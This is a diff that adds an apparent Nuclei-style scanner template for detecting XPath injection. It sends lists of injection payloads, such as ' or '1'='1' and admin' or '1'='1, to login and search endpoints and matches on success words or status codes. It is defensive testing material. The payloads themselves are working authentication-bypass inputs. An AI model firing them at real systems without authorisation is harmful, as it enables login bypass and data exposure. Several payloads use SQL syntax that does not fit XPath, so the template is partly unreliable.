@@ -1,0 +1,57 @@
+id: xpath-injection
+name: "XPath Injection Detection"
+severity: "high"
+tags: [xpath, injection]
+description: |
+  检测 XPath 注入漏洞。
+  使用 range 循环测试多个 XPath 注入载荷。
+
+variables:
+  xpath_payload: "' or '1'='1'"
+  xpath_payload2: "' or 1=1 --"
+  xpath_payload3: "' and string(1)='1"
+
+http:
+  - raw: |
+      POST /api/login HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      username={{xpath_payload}}&password=test
+    range:
+      key: "xpath_payload"
+      values:
+        - "' or '1'='1'"
+        - "' or 1=1 --"
+        - "' and string(1)='1"
+        - "' union select * from users --"
+        - "admin' or '1'='1"
+        - "' or exists(select * from users) --"
+    matchers:
+      - type: word
+        words:
+          - "Welcome"
+          - "login successful"
+          - "authenticated"
+          - "dashboard"
+      - type: status
+        status: [200]
+
+  - raw: |
+      POST /api/search HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"query": "{{xpath_payload}}"}
+    range:
+      key: "xpath_payload"
+      values:
+        - "' or '1'='1'"
+        - "*/text()"
+        - "//*/node()"
+        - "' union //users/* --"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "len(body) > 100"
